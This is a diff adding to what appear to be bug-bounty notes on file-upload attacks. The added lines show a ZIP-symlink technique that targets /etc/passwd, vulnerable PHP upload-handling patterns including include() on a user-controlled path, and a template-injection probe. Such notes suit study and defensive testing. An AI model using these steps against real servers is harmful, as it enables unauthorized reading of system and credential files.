@@ -30,3 +30,26 @@ Key point: Any file that gets processed by server-side tools could potentially l
 
 *
 { 7 * 7 }
+
+hackers:
+william bowling, yousif sammouda
+
+*
+1-Upload ZIP with symlink:
+ln -s /etc/passwd profile.jpg
+zip --symlinks archive.zip profile.jpg
+2-Need server to try reading it:
+// Example vulnerable scenarios:
+// Image processing
+$image = file_get_contents('uploads/profile.jpg');  // Follows symlink!
+// File inclusion
+include('uploads/' . $_GET['file']);  // If attacker can control path
+// File download
+readfile('uploads/' . $filename);  // Downloads symlink target
+// Backup functionality
+zip_folder('uploads/');  // Packages symlink target
+
+The key is:
+Just uploading symlink is safe
+Danger comes when server follows/processes the symlink
+Need server functionality that reads the uploaded files
